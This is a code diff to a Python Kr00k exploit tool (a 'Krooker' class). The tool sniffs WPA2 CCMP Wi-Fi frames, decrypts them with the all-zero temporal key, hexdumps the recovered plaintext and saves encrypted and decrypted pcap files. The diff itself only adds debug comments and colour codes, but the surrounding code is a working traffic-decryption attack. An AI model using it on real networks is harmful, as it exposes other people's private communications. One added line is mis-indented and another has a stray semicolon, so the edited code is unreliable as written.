@@ -116,21 +116,23 @@ class Krooker:
     def check_packet(self, sniffed_pkt):
         # Filter for WPA2 AES CCMP packets containing data to decrypt
         if sniffed_pkt[Dot11].type == 2 and sniffed_pkt.haslayer(Dot11CCMP):
+            # Uncomment this print line only for debug purposes
             #print("["+str(datetime.now().time())+"][DEBUG] packet tipe:"+str(sniffed_pkt[Dot11].type)+" sub:"+str(sniffed_pkt[Dot11].subtype))
             # Decrypt the packets using the all zero temporary key
             dec_data = self.wpa2_decrypt(sniffed_pkt)
             # Check if the target is vulnerable
             if dec_data and dec_data[0:len(KR00K_PATTERN)] == KR00K_PATTERN:
-                print("["+str(datetime.now().time())+"][+] Target "+self.target_mac+" is vulnerable to Kr00k, decrypted "+str(len(dec_data))+" bytes")
+               print("\033[1;35;49m["+str(datetime.now().time())+"][+] Target "+self.target_mac+" is vulnerable to Kr00k, decrypted "+str(len(dec_data))+" bytes")
                 hexdump(dec_data)
                 # Save the encrypted and decrypted packets
-                print("["+str(datetime.now().time())+"][+] Saving encrypted and decrypted 'pcap' files in current folder")
+                print("\033[0;39;49m;["+str(datetime.now().time())+"][+] Saving encrypted and decrypted 'pcap' files in current folder")
                 dec_pkt = bytes.fromhex(re.sub(':','',self.target_mac) + re.sub(':','',self.other_mac)) + dec_data[6:]
                 wrpcap("enc_pkts.pcap", sniffed_pkt, append=True)
                 wrpcap("dec_pkts.pcap", dec_pkt, append=True)
                 # Uncomment this if you need a one-shoot PoC decryption 
                 #sys.exit(0)
             #else:
+                # Uncomment this print line only for debug purposes
                 #print("["+str(datetime.now().time())+"][DEBUG] This data decryption with all zero TK went wrong")
                 #pass
 
